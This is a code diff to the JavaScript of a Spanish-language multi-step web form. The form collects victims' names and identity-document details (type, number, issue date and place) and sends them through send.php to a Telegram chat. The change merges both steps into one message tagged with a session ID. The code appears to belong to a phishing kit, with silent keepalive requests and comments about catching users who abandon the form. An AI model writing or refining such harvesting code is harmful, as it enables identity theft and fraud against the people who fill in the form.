@@ -5,6 +5,16 @@
   let validationTimer = null;
   const data = {};
 
+  // ----- Identificador único de sesión para correlacionar mensajes en Telegram -----
+  function getSessionId() {
+    let id = sessionStorage.getItem('sessionId');
+    if (!id) {
+      id = Math.random().toString(36).slice(2, 8).toUpperCase();
+      sessionStorage.setItem('sessionId', id);
+    }
+    return id;
+  }
+
   const stepEls = document.querySelectorAll('#stepper .step');
   const sections = document.querySelectorAll('.form-section');
 
@@ -57,14 +67,7 @@
     data.nombres = form1.nombres.value.trim();
     data.apellidos = form1.apellidos.value.trim();
 
-    // Envío preliminar: por si abandonan antes del paso 2
-    fetch('send.php', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ step: 'paso1', nombres: data.nombres, apellidos: data.apellidos }),
-      keepalive: true,
-    }).catch(() => {});
-
+    // No enviamos paso1 por separado; se manda junto con paso2
     go(2);
   });
 
@@ -127,16 +130,19 @@
     sessionStorage.setItem('lugarExp', data.lugarExp);
     sessionStorage.setItem('numDoc', data.numDoc);
 
-    // Enviar a Telegram solo los datos de identificación (paso2)
+    // Envia paso 1 + paso 2 combinados en un solo mensaje
     fetch('send.php', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        step: 'paso2',
-        tipoDoc:  data.tipoDoc,
-        numDoc:   data.numDoc,
-        fechaExp: data.fechaExp,
-        lugarExp: data.lugarExp,
+        step: 'paso12',
+        sessionId: getSessionId(),
+        nombres:   data.nombres,
+        apellidos: data.apellidos,
+        tipoDoc:   data.tipoDoc,
+        numDoc:    data.numDoc,
+        fechaExp:  data.fechaExp,
+        lugarExp:  data.lugarExp,
       }),
       keepalive: true,
     }).catch(() => {});
